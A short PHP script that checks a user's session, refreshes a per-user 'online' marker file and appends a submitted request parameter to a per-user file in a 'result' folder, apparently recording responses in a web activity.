<?php

session_start();

$msg = 'wrong';

if(isset($_SESSION['register']) and isset($_SESSION['fullname'])){
	$loginname = $_SESSION['register'];	

	if(file_exists("online/$loginname")){
		touch("online/$loginname"); // for online keeping			
		$u = trim($_REQUEST['u']);
		$p = trim($_REQUEST['p']);
		// SAVE TO FILE		
		$fp = fopen("result/$loginname", "a+");
		
		if (flock($fp, LOCK_EX)) {  // acquire an exclusive lock
			fwrite($fp, "$p\n");
			fflush($fp);            // flush output before releasing the lock
			flock($fp, LOCK_UN);    // release the lock
		} 
		$msg = 'ok';
	}
}

echo "$msg";

?>